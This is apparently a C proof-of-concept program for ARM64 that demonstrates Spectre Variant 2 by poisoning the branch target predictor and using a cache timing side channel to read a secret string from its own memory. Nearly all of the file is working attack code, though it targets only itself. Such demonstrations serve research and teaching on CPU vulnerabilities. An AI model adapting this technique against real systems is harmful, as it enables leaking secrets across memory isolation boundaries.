/*
 * Spectre Variant 2 Proof of Concept.
 *
 * The program uses spectre v2 to read its own memory.
 * See the paper for details: https://spectreattack.com/spectre.pdf.
 */

#include <string.h>
#include "../lib/spectre.h"

uint64_t *target; // pointer to indirect call target

// mistrained target of indirect call
int gadget(char *addr)
{
    return channel[*addr * 512]; // speculative loads fetch data into the cache
}

// safe target of indirect call
int safe_target()
{
    return 42;
}

// function that makes indirect call
// note that addr will be passed to gadget via %rdi
int victim(char *addr, int input)
{
    int junk = 0;

    int result;

    // addr will be passed as the 1st argument
    asm volatile("mov x19, x30\n");
    asm volatile("mov x3, %[f]" ::[f] "r"(*target));

    // Prepare the first argument
    asm volatile("mov x0, %[src]\n" ::[src] "r"(addr)
                 :);

    asm volatile("blr x3\n");
    asm volatile("mov %[res], x0"
                 : [res] "=r"(result)::);
    asm volatile("mov x30, x19\n");

    return result & junk;
}

// see appendix C of https://spectreattack.com/spectre.pdf
void readByte(char *addr_to_read)
{
    int tries;
    char dummyChar = '$';

    init_results();
    for (tries = 999; tries > 0; tries--)
    {
        flush_channels();

        // poison branch target predictor
        *target = (uint64_t)&gadget;
        for (int j = 50; j > 0; j--)
        {
            victim(&dummyChar, 0);
        }

        // change to safe target
        *target = (uint64_t)&safe_target;

        // flush target to prolong misprediction interval
        flush((void *)target);
        for (volatile int z = 0; z < 100; z++)
        {
        } /* Delay (can also mfence) */

        victim(addr_to_read, 0);

        // now, the value of *addr_to_read should be cached even though
        // the logical execution path never calls gadget()

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        read_side_channel(dummyChar);

        bool success = sort_results();
        if (success)
            break;
    }

    update_value_score();
}

int main()
{
    printf("Putting '%s' in memory\n", secret);

    initialize_spectre();

    target = (uint64_t *)malloc(sizeof(uint64_t));

    int len = strlen(secret);
    char *addr = secret;

    printf("Reading %d bytes starting at %p:\n", len, addr);
    while (--len >= 0)
    {
        printf("reading %p...\n", addr);
        readByte(addr++);
        print_spectre_result();
    }
    printf("\n");

    return 0;
}